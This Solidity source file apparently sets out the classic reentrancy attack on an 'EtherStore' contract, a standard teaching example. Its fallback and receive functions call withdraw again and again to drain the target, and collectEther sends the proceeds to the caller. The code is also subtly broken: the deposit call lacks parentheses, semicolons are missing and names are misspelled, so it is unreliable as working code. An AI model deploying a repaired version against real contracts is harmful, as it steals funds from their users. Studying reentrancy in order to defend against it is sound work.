// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.4.16 <=0.8.4;
import "./EtherStore.sol";

contract AttackReentracny {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress); //创建etherStore合约对象
    }

    function attckWithdraw() public payable {
        require(msg.value >= 1 ether);
        etherStore.depositFunds{value: 1 ether};
        //attack intro
        etherStore.withdraw(1 ether);
    }

    function collectEther() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    fallback() external payable {
        if (etherStore.balance > 1 ether) {
            etherStore.withdraw(1 ether)
        };
    }

    receive() external payable {
        if (etherStore.balance > 1 ether) { 
            etherStore.withdraw(1 ether)
        };
    }
}
